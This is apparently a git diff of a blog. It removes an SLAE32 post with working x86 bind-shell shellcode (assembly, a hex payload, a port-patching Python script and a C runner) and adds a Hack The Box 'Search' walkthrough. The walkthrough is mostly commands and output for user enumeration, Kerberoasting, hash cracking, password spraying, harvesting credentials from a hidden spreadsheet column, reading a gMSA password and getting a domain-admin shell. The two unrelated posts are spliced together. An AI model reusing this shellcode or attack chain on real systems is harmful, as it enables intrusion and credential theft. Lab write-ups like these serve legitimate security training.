-slemire@slae:~/slae32/assignment1$ gcc -o shellcode -fno-stack-protector -z execstack shellcode.c    
-slemire@slae:~/slae32/assignment1$ ./shellcode
-[...]
-slemire@slae:~$ nc -nv 127.0.0.1 4444
-Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
-whoami
-slemire
+Nothing found in smb so we go to rpd
+```console
+❯ rpcclient -U 'hope.sharp%IsolationIsKey?' 10.10.11.129 -c 'enumdomusers'
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[Santino.Benjamin] rid:[0x4aa]
+user:[Payton.Harmon] rid:[0x4ab]
+user:[Trace.Ryan] rid:[0x4ac]
+....
 ```
-
-### 2nd version using syscalls
-------------------------------
-The 2nd version of this bind shellcode uses the new syscalls. According to the following [kernel patch](https://patchwork.kernel.org/patch/146431/), sometimes in 2010 they added new syscall entries for non-multiplexed socket calls.
-
-The ones that interest us are:
-
-```c
-#define __NR_socket 359
-#define __NR_bind 361
-#define __NR_connect 362
-#define __NR_listen 363
-#define __NR_accept4 364
+A lot of stuff so we filter what is inside of [] and save it in users.txt
+```console
+   ~/Desktop/h4rticx/HTB/search/content  rpcclient -U 'hope.sharp%IsolationIsKey?' 10.10.11.129 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
 ```
-
-Instead of using `sys_socketcall`, we can use those syscalls directly and put the arguments in the registers. The same code flow is used but the arguments are passed differently.
-
-The second version of the shellcode looks like this:
-
-```nasm
-global _start
-
-section .text
-
-_start:
-
-    ; Zero registers
-    xor eax, eax
-    xor ebx, ebx
-    xor ecx, ecx
-    xor edx, edx
-
-    ; Create socket
-    mov ax, 0x167       ; sys_socket
-    mov bl, 0x2         ; int domain -> AF_INET
-    inc ecx             ; int type -> SOCK_STREAM
-    mov dl, 0x6         ; int protocol -> IPPROTO_TCP
-    int 0x80            ; sys_socket
-    mov edi, eax        ; save socket fd
-
-    ; Create addr struct
-    xor edx, edx
-    push edx            ; NULL padding
-    push edx            ; NULL padding
-    push edx            ; sin.addr (0.0.0.0)
-    push word 0x5c11    ; Port
-    push word 0x2       ; AF_INET
-    mov esi, esp
-
-    ; Bind socket
-    mov ax, 0x169       ; sys_bind
-    mov ebx, edi        ; int sockfd -> saved socket fd
-    mov ecx, esi        ; const struct sockaddr *addr
-    mov dl, 0x10        ; socklen_t addrlen
-    int 0x80            ; sys_bind
-
-    ; Listen for connection
-    mov ax, 0x16b       ; sys_listen
-    mov ebx, edi        ; int sockfd -> saved socket fd
-    xor ecx, ecx        ; int backlog -> NULL
-    int 0x80            ; sys_socketcall (SYS_LISTEN)
-
-    ; Accept connection
-    mov ax, 0x16c       ; sys_accept4
-    mov ebx, edi        ; int sockfd -> saved sock fd value
-    xor ecx, ecx        ; struct sockaddr *addr -> NULL
-    xor edx, edx        ; socklen_t *addrlen -> NULL
-    xor esi, esi
-    int 0x80            ; sys_socketcall (SYS_ACCEPT)
-    mov edi, eax        ; save the new fd
-
-    ; Redirect STDIN, STDOUT, STDERR to socket
-    xor ecx, ecx
-    mov cl, 0x3         ; counter for loop (stdin to stderr)
-    mov ebx, edi        ; socket fd
-
-    dup2:
-    mov al, 0x3f        ; sys_dup2
-    dec ecx
-    int 0x80            ; sys_dup2
-    inc ecx
-    loop dup2
-
-    ; execve()
-    xor eax, eax
-    push 0x41687361     ; ///bin/bashA
-    push 0x622f6e69
-    push 0x622f2f2f
-    mov byte [esp + 11], al ; NULL terminate string
-    mov al, 0xb         ; sys_execve
-    mov ebx, esp        ; const char *filename
-    xor ecx, ecx        ; char *const argv[]
-    xor edx, edx        ; char *const envp[]
-    int 0x80            ; sys_execve
+We try if some user in the list is vulnerable to ASREPRoast attack
+```colsone
+❯ GetNPUsers.py -usersfile users.txt search.htb/
 ```
+But is not vulnerable. So i tried kerberoasting attack and gaining a TGS with the authentication i have.
+```console
+❯ GetUserSPNs.py search.htb/hope.sharp
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
-If we want to change the listening port, we can modify the assembly code and re-compile it but instead it would be more convenient to use a small python script that will automatically replace the port in the shellcode.
-
-The following script replaces the hardcoded port `4444` from the shellcode with the port supplied at the command line. The script also gives a warning if any null bytes are contained in the modified shellcode. Depending on which port is being used, it's possible some values may generate null bytes.
-
-```python
-#!/usr/bin/python
-
-import socket
-import sys
-
-shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01'
-shellcode += '\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68\\x11\\x5c\\x66'
-shellcode += '\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80'
-shellcode += '\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52'
-shellcode += '\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f\\x49'
-shellcode += '\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e\\x2f'
-shellcode += '\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31\\xc9'
-shellcode += '\\x31\\xd2\\xcd\\x80'
-
-if len(sys.argv) < 2:
-    print('Usage: {name} [port]'.format(name = sys.argv[0]))
-    exit(1)
-
-port = sys.argv[1]
-port_htons = hex(socket.htons(int(port)))
-
-byte1 = port_htons[4:]
-if byte1 == '':
-    byte1 = '0'
-byte2 = port_htons[2:4]
-shellcode = shellcode.replace('\\x11\\x5c', '\\x{}\\x{}'.format(byte1, byte2))
-
-print('Here\'s the shellcode using port {port}:'.format(port = port))
-print(shellcode)
-
-if '\\x0\\' in shellcode or '\\x00\\' in shellcode:
-    print('##################################')
-    print('Warning: Null byte in shellcode!')
-    print('##################################')
+Password:
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+---------------------------------  -------  --------  --------------------------  --------------------------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  2022-05-06 18:41:52.306143
 ```
+And boom "web_svc" seems to be vulnerable so i get his hash.
+```console
+❯ GetUserSPNs.py search.htb/hope.sharp -request
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
-Here's the script in action:
+Password:
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+---------------------------------  -------  --------  --------------------------  --------------------------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  2022-05-06 18:41:52.306143             
+
+
+
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
-slemire@slae:~/slae32/assignment1$ ./prepare.py 5555
-Here's the shellcode using port 5555:
-\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
-```
+But we get that error because we need to syncronice with the server so i use ntpdate.
+```console
+❯ sudo ntpdate 10.10.11.129
+ 7 May 11:19:40 ntpdate[19962]: step time server 10.10.11.129 offset +1158.214479 sec
 
-The shellcode is then added to the test program.
-```c
-#include <stdio.h>
+❯ GetUserSPNs.py search.htb/hope.sharp -request
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
-char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
+Password:
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+---------------------------------  -------  --------  --------------------------  --------------------------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031  2022-05-06 18:41:52.306143             
 
-int main()
-{
-        int (*ret)() = (int(*)())shellcode;
-        printf("Size: %d bytes.\n", sizeof(shellcode)); 
-        ret();
-}
-```
+
+
+$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$9e9223c971dd5d99875ca1dfd979cdb5$be9aa0663b5a5258e3371cc721487558a29e1a7446ac00114bb66d9f6025fe8b8ffd9aba5c7207f11f50d57cff62bef2e877ec2c122cb6f9444173dd986cee43211782715a0b799d3d220b25999709091b84abc0968bcaa184b00b10325e5ed10f91f90985b90d70fd9997fdcb4923d38be82415e04846fc408015e61f49ae0e0b6efa3da9d92d5c588c076245803f87da74e7384119cb786b3a21c6bd661583c3d35c909108e94a1f6f2bd7e8f3d75e6861a180baaee0dbbccede47dbc7246f031df6891fbce5c48634017c80e66ebca74624b76a39ca18187a01a2b7afc4e21174b1f2e8323c83ee69271c776434743d4da46f6f42c1f65c36ac34eb5d6229e532c2dd6d808db2ceede45d9fe0c8183ca8460f54513ac5d2175776a3372df430c98ef1c8f88adb67a0b85b0190c79ed65f572cb54180eb2c1b0602a2663c950b71b8b71fb1dde35906f7e5917fde41328cab3351545094db7748f23b528cf8781ceb172d9ef361f237bbb4a6f898f3cc46a5ced33e628d82f915f9e145e3b92815abb1aebcc0c426f505cd41146c680d79805ee4aeca3a929438ea26ab48dd38def71da5a54c21e9f8f66cef939cd157992fae652277abfc05ea1e21a6bfacac7c7d5471547fcf5344517ff9860dace2d13a7a8f94ac1d420c2a8dc5e6008a768d2a281f9ff08c9b5ebb5ac1b12f37ec73792e3735634f13ebe77c2c1acec457d138c7bb7a286317e24c3f25dad05260ca9ddcf5bb4fad527bd9a9ec8980440bc18fe626381ab003cbdbeeec54429f40dc382e0bdb99a13c99a2d28c4e9e4191d0878a110e3e714d229009ca8391951dede95ef9f1d9e9b36d7800cdd23a959b6d3930d120d575e416dafac32e4647586731fb0c01c1b8f62e75f8eb0e14d3c31dc3fd584a7274d75590ead52a9fa84390d52810bbd611f2d985ecb5f13a1c210d9e9aa631a757f231b520095ff090da11f815cef615dcd08721d0b87d59c2c87b6385b23300566cc7d97e81ff2db689aeb31b22109c801b1e1d5ce79167aa4fb4d1718299e83c065f64baf2e67529b9d13bf1c54cfd4bcd307ed4b3f988ea2a13c503e8b8193e197db90c8b0ad4b56b5db022c392403ecd6b76b24440f5ec4936c4608f346490d26709e132aced32a51e458e459ce52aadf9b836e34938f0a1d31c0c3b64840df4a5772574fca2ec5bc39d23be737a7ea9ff22a67eeeb1fd324f1e91a7cd5f065490318747aedc8a1d67d145d10c44cc2b5fe92fc69f9545bb2594dfa26e44f80643eccaf0aaa663ba48fda3ba023b7baf5b1700d9c5b1d9b78e7a5ad5f8cab24c37ccc50a31223f43b07245aa460932768a33524ff9cc7017d04247fe65680c930864dfe805be12458cd902b6d2106a9915b6d8374ad03cef5d0a7fd3f818891b95adb90dc2bf9f4c2c92bc75c029ff089bd7a7801b23de5ddfe95b2452d59babaf1ff329ba97901369c1b0e5
 
 ```
-slemire@slae:~$ gcc -o test -fno-stack-protector -z execstack shellcode.c 
-slemire@slae:~$ ./test
-[...]
-slemire@slae:~$ nc -nv 127.0.0.1 5555
-Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
-whoami
-slemire
+Use john to crack the password
+```console
+❯ john -w:/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
+[archlinux:20199] [[34662,0],0] ORTE_ERROR_LOG: Data unpack would read past end of buffer in file util/show_help.c at line 501
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+**************** (?)
+1g 0:00:00:13 DONE (2022-05-07 11:21) 0.07412g/s 851764p/s 851764c/s 851764C/s @4208891ncv..@#alexandra$&
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+Now try if other user in using the same password with crackmapexec
+```console
+❯ crackmapexec smb 10.10.11.129 -u users.txt -p "@3ONEmillionbaby" --continue-on-success
+SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Administrator:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Guest:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\krbtgt:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Santino.Benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE
+.......
+SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 
+```
+Found edgar.jacobs with same credentials
+```console 
+❯ smbmap -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -H 10.10.11.129 -r 'RedirectedFolders$/edgar.jacobs/Desktop' --no-banner
+                                                                                                    
+[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	RedirectedFolders$                                	READ, WRITE	
+	.\RedirectedFolders$\edgar.jacobs\Desktop\*
+	dw--w--w--                0 Mon Aug 10 10:02:16 2020	.
+	dw--w--w--                0 Mon Aug 10 10:02:16 2020	..
+	dr--r--r--                0 Thu Apr  9 20:05:29 2020	$RECYCLE.BIN
+	fr--r--r--              282 Mon Aug 10 10:02:16 2020	desktop.ini
+	fr--r--r--             1450 Thu Apr  9 20:05:03 2020	Microsoft Edge.lnk
+	fr--r--r--            23130 Mon Aug 10 10:30:05 2020	Phishing_Attempt.xlsx
+```
+Find Phishing_Attempt.xlsx in his home, weird so we download it.
+
+![image libreoffice1](/assets/images/libreoffice1.png)
+Column C seems to be hiden and we cant modify it, but if we decompress it we can change the code to get ride of the authorization.
+```console
+❯ ls
+ 10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx   hash
+ credentials.txt                                                             users.txt
+❯ mv 10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx phishing_attempt.xlsx
+❯ libreoffice phishing_attempt.xlsx
+^C
+❯ ls
+ credentials.txt   hash   phishing_attempt.xlsx   users.txt
+❯ mkdir lb
+❯ cd !$
+cd lb
+❯ mv ../phishing_attempt.xlsx .
+❯ ls
+ phishing_attempt.xlsx
+❯ unzip phishing_attempt.xlsx
+Archive:  phishing_attempt.xlsx
+  inflating: [Content_Types].xml     
+  inflating: _rels/.rels             
+  inflating: xl/workbook.xml         
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/worksheets/sheet2.xml  
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/sharedStrings.xml    
+  inflating: xl/drawings/drawing1.xml  
+  inflating: xl/charts/chart1.xml    
+  inflating: xl/charts/style1.xml    
+  inflating: xl/charts/colors1.xml   
+  inflating: xl/worksheets/_rels/sheet1.xml.rels  
+  inflating: xl/worksheets/_rels/sheet2.xml.rels  
+  inflating: xl/drawings/_rels/drawing1.xml.rels  
+  inflating: xl/charts/_rels/chart1.xml.rels  
+  inflating: xl/printerSettings/printerSettings1.bin  
+  inflating: xl/printerSettings/printerSettings2.bin  
+  inflating: xl/calcChain.xml        
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml        
+❯ ls
+ _rels   docProps   xl   [Content_Types].xml   phishing_attempt.xlsx
+❯ nvim xl/worksheets/sheet2.xml
+❯ ls
+ _rels   docProps   xl   [Content_Types].xml   phishing_attempt.xlsx
+❯ rm phishing_attempt.xlsx
+❯ zip Documnt.xlsx -r .
+  adding: _rels/ (stored 0%)
+  adding: _rels/.rels (deflated 60%)
+  adding: docProps/ (stored 0%)
+  adding: docProps/core.xml (deflated 47%)
+  adding: docProps/app.xml (deflated 52%)
+  adding: [Content_Types].xml (deflated 79%)
+  adding: xl/ (stored 0%)
+  adding: xl/drawings/ (stored 0%)
+  adding: xl/drawings/drawing1.xml (deflated 58%)
+  adding: xl/drawings/_rels/ (stored 0%)
+  adding: xl/drawings/_rels/drawing1.xml.rels (deflated 39%)
+  adding: xl/printerSettings/ (stored 0%)
+  adding: xl/printerSettings/printerSettings1.bin (deflated 67%)
+  adding: xl/printerSettings/printerSettings2.bin (deflated 67%)
+  adding: xl/charts/ (stored 0%)
+  adding: xl/charts/colors1.xml (deflated 73%)
+  adding: xl/charts/_rels/ (stored 0%)
+  adding: xl/charts/_rels/chart1.xml.rels (deflated 49%)
+  adding: xl/charts/chart1.xml (deflated 77%)
+  adding: xl/charts/style1.xml (deflated 90%)
+  adding: xl/sharedStrings.xml (deflated 55%)
+  adding: xl/theme/ (stored 0%)
+  adding: xl/theme/theme1.xml (deflated 80%)
+  adding: xl/_rels/ (stored 0%)
+  adding: xl/_rels/workbook.xml.rels (deflated 74%)
+  adding: xl/calcChain.xml (deflated 55%)
+  adding: xl/worksheets/ (stored 0%)
+  adding: xl/worksheets/_rels/ (stored 0%)
+  adding: xl/worksheets/_rels/sheet2.xml.rels (deflated 42%)
+  adding: xl/worksheets/_rels/sheet1.xml.rels (deflated 55%)
+  adding: xl/worksheets/sheet2.xml (deflated 73%)
+  adding: xl/worksheets/sheet1.xml (deflated 79%)
+  adding: xl/styles.xml (deflated 89%)
+  adding: xl/workbook.xml (deflated 60%)
+❯ ls
+ _rels   docProps   xl   [Content_Types].xml   Documnt.xlsx
+```
+![image libreoffice2](/assets/images/libreoffice2.png)
+
+Open the Document.xlsx and u have the credentials.
+
+![image user](/assets/images/libreoffice3.png)
+create credentials.txt with the creds and a user.txt with the users and use crackmapexec.
+```console
+❯ crackmapexec smb 10.10.11.129 -u user.txt -p credentials.txt --continue-on-success --no-bruteforce
+SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&6
+```
+Found that Sierra.Fry has a correct password so we try smbmap to see if she had Something in his Desktop
+```console
+❯ smbmap -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -H 10.10.11.129  -r 'RedirectedFolders$/sierra.frye/Downloads/Backups' --no-banner
+                                                                                                    
+[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	RedirectedFolders$                                	READ, WRITE	
+	.\RedirectedFolders$\sierra.frye\Downloads\Backups\*
+	dr--r--r--                0 Mon Aug 10 20:39:17 2020	.
+	dr--r--r--                0 Mon Aug 10 20:39:17 2020	..
+	fr--r--r--             2643 Fri Jul 31 15:04:11 2020	search-RESEARCH-CA.p12
+	fr--r--r--             4326 Mon Aug 10 20:39:17 2020	staff.pfx
+```
+Find backups with some pfx files, tried download it and need a password to import it in browser. So with pfx2john get hash and crack it.
+Then import the certs to the browser.
+
+![image certs](/assets/images/certs.png)
+But we dont know why we need the certs for, so we do fuzzing to found a page to use it.
+```console
+wfuzz -c -t 200 --hh=44982 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://search.htb/FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://search.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                      
+=====================================================================
+
+000000016:   301        1 L      10 W       148 Ch      "images"                                     
+000000203:   301        1 L      10 W       148 Ch      "Images"                                     
+000000245:   403        29 L     92 W       1233 Ch     "staff"                                      
+000000550:   301        1 L      10 W       145 Ch      "css"                                        
+000000953:   301        1 L      10 W       144 Ch      "js"                                         
+000002771:   301        1 L      10 W       147 Ch      "fonts"                                      
+000002614:   403        29 L     92 W       1233 Ch     "Staff"
+```
+found staff route with 403. Lets inspect that.
+![image certs](/assets/images/staffpage.png)
+We try the sierra credentials and we are in.
+Now its time to use BloodHound, so first we use BloodHound-python and with the credentials we have we recollect all information.
+```console
+❯ python3 bloodhound.py -u 'hope.sharp' -p 'IsolationIsKey?' -d search.htb -ns 10.10.11.129 -c ALL
+INFO: Found AD domain: search.htb
+INFO: Connecting to LDAP server: research.search.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 113 computers
+INFO: Connecting to LDAP server: research.search.htb
+INFO: Found 107 users
+INFO: Found 64 groups
+INFO: Found 0 trusts
+.....
+```
+Import the files we get to the bloodhound and we mark the users we pwnd ass owned.
+then we click on short path to get domain admin and we get Something like this:
+![image certs](/assets/images/bloodhound1.png)
+Now you can see in the bloodhound that you can gain access to BIR-ADFS-GMSA via ReadGMSAPassword so in this page is explained perfectly
+[Link Text]([https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/])
+So lets follow the instructions.
+![image certs](/assets/images/powershell1.png)
+```console
+   ~/Desktop/h4rticx/HTB/search/content  crackmapexec smb 10.10.11.129 -u 'tristan.davies' -p 'h4rticx123'
+SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:h4rticx123 (Pwn3d!)
+```
+And pwned, thats it.
+Time to connect via wmiexec
+```console
+❯ wmiexec.py search.htb/tristan.davies@10.10.11.129
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+C:\>whoami
+search\tristan.davies
+
+C:\>net user tristan.davies
+User name                    Tristan.Davies
+Full Name                    Tristan Davies
+Comment                      The only Domain Admin allowed, Administrator will soon be disabled
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            07/05/2022 15:40:17
+Password expires             Never
+Password changeable          08/05/2022 15:40:17
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   07/05/2022 15:34:44
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       
+Global Group memberships     *Domain Admins        *Domain Users         
+                             *Enterprise Admins    *Group Policy Creator 
+                             *Schema Admins        
+The command completed successfully.
 ```
 
-This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
-[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
 
-Student ID: SLAE-1236
-
-All source files can be found on GitHub at [https://github.com/slemire/slae32](https://github.com/slemire/slae32)
